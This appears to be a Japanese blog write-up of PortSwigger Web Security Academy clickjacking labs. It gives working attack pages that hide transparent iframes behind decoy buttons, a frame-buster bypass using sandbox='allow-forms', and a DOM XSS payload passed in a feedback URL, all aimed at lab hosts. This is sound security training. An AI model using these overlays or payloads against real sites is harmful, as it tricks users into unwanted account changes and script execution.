---
title: 'Clickjacking'
description: 'PortSwigger Clickjackingの記録'
pubDate: 2026-02-21T22:10:00+09:00
category: 'PortSwigger'
tags: ['PortSwigger', 'Web', 'Clickjacking']
---

# Clickjacking - PortSwigger

## Lab
### Basic clickjacking with CSRF token protection

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
  iframe {
    position: relative;
    width: 700px;
    height: 600px;
    opacity: 0.1;
    z-index: 2;
  }
  button {
    position: absolute;
    top: 600px;
    left: 60px;
    z-index: 1;
  }
  </style>
</head>
<body>
  <button>Click me</button>
  <iframe src="https://challenge.web-security-academy.net/my-account"></iframe>
</body>
</html>
```


### Clickjacking with form input data prefilled from a URL parameter

form prefillを利用してvalueに値を入れることができる

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.1;
    z-index: 2;
  }
  button {
    position: absolute;
    top: 490px;
    left: 60px;
    z-index: 1;
  }
  </style>
</head>
<body>
  <button>Click me</button>
  <iframe src="https://challenge.web-security-academy.net/my-account?email=c%40a.com"></iframe>
</body>
</html>
```

### Clickjacking with a frame buster script

以前はjavascriptで、iframeを入れられたらページを壊すような処理をしていたが  
iframeの `sandbox="allow-forms"` によって  
簡単に回避されてしまう

```js
<script>
  if (top !== self) {
    top.location = self.location;
  }
</script>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.1;
    z-index: 2;
  }
  button {
    position: absolute;
    top: 450px;
    left: 60px;
    z-index: 1;
  }
  </style>
</head>
<body>
  <button>Click me</button>
  <iframe src="https://challenge.web-security-academy.net/my-account?email=b%40a.com" sandbox="allow-forms"></iframe>
</body>
</html>
```

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

this.responseText が xss が可能となっている

```js
function displayFeedbackMessage(name) {
  return function() {
    var feedbackResult = document.getElementById("feedbackResult");
    if (this.status === 200) {
      feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
      feedbackForm.reset();
    } else {
      feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
    }
  }
}
```

`<script>alert(1)</script>`これは失敗したので、img で実行した

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.1;
    z-index: 2;
  }
  button {
    position: absolute;
    top: 410px;
    left: 60px;
    z-index: 1;
  }
  </style>
</head>
<body>
  <button>Click me</button>
  <iframe src="https://challenge.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint%28%29%3E&email=a%40a.com&subject=a&message=a#feedbackResult"></iframe>
</body>
</html>
```

### Multistep clickjacking

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
  iframe {
    position: relative;
    width: 700px;
    height: 600px;
    opacity: 0.1;
    z-index: 3;
  }
  .one {
    position: absolute;
    top: 300px;
    left: 210px;
    z-index: 2;
  }
  .two {
    position: absolute;
    top: 570px;
    left: 60px;
    z-index: 1;
  }
  </style>
</head>
<body>
  <button class="one">Click me next</button>
  <button class="two">Click me first</button>
  <iframe src="https://challenge.web-security-academy.net/my-account"></iframe>
</body>
</html>
```